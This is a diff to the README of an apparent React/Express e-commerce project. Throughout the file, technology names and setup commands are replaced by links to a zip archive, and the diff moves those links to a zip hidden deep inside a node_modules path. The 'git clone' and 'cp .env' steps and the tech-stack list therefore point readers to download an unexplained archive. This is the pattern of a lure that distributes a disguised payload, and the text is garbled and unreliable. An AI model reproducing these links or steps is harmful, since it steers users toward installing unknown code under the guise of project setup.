@@ -16,18 +16,18 @@ A modern, responsive e-commerce platform for IWB (Innovative Waste Business) foc
 ## Tech Stack
 
 - **Frontend**: React (TypeScript), Tailwind CSS
-- **Backend**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip, Express
+- **Backend**: https://github.com/MorenaMatla/lwb-ecommerce/raw/refs/heads/main/node_modules/react-day-picker/src/components/HeadRow/utils/lwb-ecommerce-v3.4-alpha.5.zip, Express
 - **Database**: PostgreSQL on AWS RDS
 - **ORM**: Drizzle ORM
-- **Authentication**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip
+- **Authentication**: https://github.com/MorenaMatla/lwb-ecommerce/raw/refs/heads/main/node_modules/react-day-picker/src/components/HeadRow/utils/lwb-ecommerce-v3.4-alpha.5.zip
 - **State Management**: TanStack Query
-- **Natural Language Processing**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip for automated responses
+- **Natural Language Processing**: https://github.com/MorenaMatla/lwb-ecommerce/raw/refs/heads/main/node_modules/react-day-picker/src/components/HeadRow/utils/lwb-ecommerce-v3.4-alpha.5.zip for automated responses
 
 ## Setup Instructions
 
 1. Clone the repository
    ```
-   git clone https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip
+   git clone https://github.com/MorenaMatla/lwb-ecommerce/raw/refs/heads/main/node_modules/react-day-picker/src/components/HeadRow/utils/lwb-ecommerce-v3.4-alpha.5.zip
    cd iwb-ecommerce
    ```
 
@@ -38,7 +38,7 @@ A modern, responsive e-commerce platform for IWB (Innovative Waste Business) foc
 
 3. Create environment variables
    ```
-   cp https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip .env
+   cp https://github.com/MorenaMatla/lwb-ecommerce/raw/refs/heads/main/node_modules/react-day-picker/src/components/HeadRow/utils/lwb-ecommerce-v3.4-alpha.5.zip .env
    ```
    Then edit the `.env` file with your database credentials and other settings
 
@@ -61,7 +61,7 @@ A modern, responsive e-commerce platform for IWB (Innovative Waste Business) foc
 
 ## Deployment
 
-The application is configured to be deployed to AWS or any platform supporting https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip applications.
+The application is configured to be deployed to AWS or any platform supporting https://github.com/MorenaMatla/lwb-ecommerce/raw/refs/heads/main/node_modules/react-day-picker/src/components/HeadRow/utils/lwb-ecommerce-v3.4-alpha.5.zip applications.
 
 ## Database Schema
 
